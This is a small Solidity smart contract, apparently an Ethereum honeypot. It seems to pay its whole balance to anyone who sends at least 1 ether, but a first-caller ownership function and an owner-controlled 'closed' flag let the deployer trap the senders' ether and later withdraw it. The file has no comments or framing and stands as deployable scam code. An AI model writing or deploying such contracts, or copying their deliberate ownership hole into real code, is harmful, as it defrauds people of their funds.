1 pragma solidity ^0.4.25;
2 
3 contract MacLennonIC {
4     function() public payable {}
5     address Owner; bool closed = false;
6     function set() public payable {
7         if (0==Owner) Owner=msg.sender;
8     }
9     function close(bool F) public {
10         if (msg.sender==Owner) closed=F;
11     }
12     function get() public payable {
13         if (msg.value>=1 ether && !closed) {
14             msg.sender.transfer(address(this).balance);
15         }
16     }
17 }